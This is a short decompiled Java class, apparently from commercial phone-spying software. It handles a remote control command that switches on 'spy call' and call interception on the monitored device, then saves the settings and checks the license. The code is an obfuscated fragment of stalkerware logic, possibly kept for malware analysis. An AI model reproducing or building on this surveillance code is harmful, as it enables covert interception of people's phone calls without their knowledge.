package com.vvt.appengine.a;

import com.vvt.appengine.AppEngine1;
import com.vvt.appengine.i;
import com.vvt.preference.FxPreferenceType;
import com.vvt.preference.PrefSpyCall;
import com.vvt.productinfo.ProductInfoImpl;
import com.vvt.remotecontrol.ControlCommand;
import java.util.List;

public class cb
{
  private static final boolean a = a.a;
  
  public boolean a(ControlCommand paramControlCommand, AppEngine1 paramh)
  {
    boolean bool1 = a;
    if (bool1) {}
    com.vvt.preference.b localb = paramh.n;
    Object localObject1 = FxPreferenceType.SPY_CALL;
    localObject1 = (PrefSpyCall)localb.a((FxPreferenceType)localObject1);
    List localList = i.b(paramh).b();
    Object localObject2 = paramh.k;
    ProductInfoImpl localProductInfoImpl = paramh.o;
    String str = paramh.l.d();
    boolean bool2 = ((com.vvt.license.b)localObject2).a(localProductInfoImpl, str);
    localObject2 = paramControlCommand.getData();
    boolean bool3 = localObject2 instanceof Boolean;
    if (bool3)
    {
      localObject2 = (Boolean)localObject2;
      boolean bool4 = ((Boolean)localObject2).booleanValue();
      ((PrefSpyCall)localObject1).setSpyCallEnabled(bool4);
      ((PrefSpyCall)localObject1).setCallInterceptEnabled(bool4);
      localb.b();
      bool1 = a;
      if (bool1) {}
      i.b(paramh, localList, bool2);
    }
    bool1 = a;
    if (bool1) {}
    return true;
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/maind/classes-enjarify.jar!/com/vvt/appengine/a/cb.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */